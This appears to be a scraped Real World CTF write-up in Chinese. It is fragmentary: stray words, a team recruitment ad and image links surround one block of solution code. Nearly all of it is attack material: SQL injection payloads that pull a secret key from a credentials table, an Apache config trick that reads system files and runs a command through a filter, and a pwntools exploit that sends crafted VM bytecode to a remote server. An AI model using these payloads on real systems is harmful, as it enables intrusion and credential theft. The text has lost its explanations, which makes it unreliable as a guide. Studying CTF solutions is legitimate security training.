# RWCTF-WriteUp

> 原文: https://www.ctfiot.com/24194.html
> ID: 24194

target

target_credentials

login_session

exp

passwd

result

a

cmd_exe

end

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析 长期招新

欢迎联系admin@chamd5.org


```
name='; PREPARE pcat AS select 1,2; EXECUTE pcat;--
name='; PREPARE pcat AS select 1,tablename from pg_tables where schemaname='public' offset 0;; EXECUTE pcat;--
select 1,column_name from information_schema.columns where table_schema='public' and table_name='target_credentials' offset 0
name='; PREPARE pcat AS select table_name,column_name from information_schema.columns offset 0; EXECUTE pcat;--
name='; PREPARE pcat AS select 1,secret_key from target_credentials offset 0; EXECUTE pcat;--
sampleFile = req.files[req.query.formid];
userdir = md5(md5(req.socket.remoteAddress) + sampleFile.md5);
userfile = sampleFile.name.toString();
if(userfile.includes('/')||userfile.includes('..')){
    return res.status(500).send("Invalid file name");
}
uploadPath = '/uploads/' + userdir + '/' + userfile;
ErrorDocument 404 "%{file:/etc/apache2/apache2.conf}"
ExtFilterDefine 7f39f8317fgzip mode=output cmd=/bin/gzip
from pwn import *
    #p = process("./svme")
p = remote("47.243.140.252", 1337)
'''
    { "noop",   0 },    // 0
    { "iadd",   0 },    // 1
    { "isub",   0 },    // 2
    { "imul",   0 },    // 3
    { "ilt",    0 },    // 4
    { "ieq",    0 },    // 5
    { "br",     1 },    // 7
    { "brt",    1 },    // 8
    { "brf",    1 },    // 9
    { "iconst", 1 },    // 10
    { "load",   1 },
    { "gload",  1 },
    { "store",  1 },
    { "gstore", 1 },
    { "print",  0 },
    { "pop",    0 },
    { "call",   3 },
    { "ret",    0 },
    { "halt",   0 }
'''

payload = p32(0x10)+p32(4)+p32(0x7)+p32(0)+p32(0xa)+p32(0x6)+p32(0xa)+p32(0x5)+p32(0xa)+p32(0x4)+p32(0xa)+p32(0x3)
payload += p32(0xa)+p32(0x6)+p32(0xa)+p32(0x5)+p32(0xb)+p32(0x87)+p32(0xb)+p32(0x86)+p32(0x9)+p32(0xfffffac0)+p32(1)
payload += p32(0xd)+p32(0x86)+p32(0xd)+p32(0x87)#+p32(0xd)+p32(0x88)+p32(0xd)+p32(0x89)+p32(0xf)+p32(0x9)+p32(0)+p32(1)+p32(0xd)+p32(0x88)+p32(0xd)+p32(0x89)
payload += p32(0xb)+p32(0x87)+p32(0xb)+p32(0x86)+p32(0x9)+p32(0xffffffff)+p32(1)+p32(0xd)+p32(0x88)+p32(0xd)+p32(0x89)
payload += p32(0xb)+p32(0x87)+p32(0xb)+p32(0x86)+p32(0x9)+p32(0x190a37)+p32(1)+p32(0xd)+p32(0x8a)+p32(0xd)+p32(0x8b)
payload += p32(0xb)+p32(0x87)+p32(0xb)+p32(0x86)+p32(0x9)+p32(0x2e89d)+p32(1)+p32(0xd)+p32(0x8c)+p32(0xd)+p32(0x8d)
payload += p32(0xf)*2+p32(0xa)+p32(0x2)+p32(0xa)+p32(0x1)
payload += p32(9)+p32(0)+p32(9)+p32(0)+p32(9)+p32(0)+p32(9)+p32(0)+p32(0x12)
#
p.send(payload.ljust(0x200, b"x00"))

p.interactive()
rwctf{Super_Hunters_Conquer_Together}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/01/0-1643162241.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/01/5-1643162241.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/01/6-1643162242.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/01/7-1643162242.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/01/3-1643162242.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/01/0-1643162242.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/01/3-1643162242-1.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/01/2-1643162243.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/01/4-1643162243.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/01/3-1643162244.png)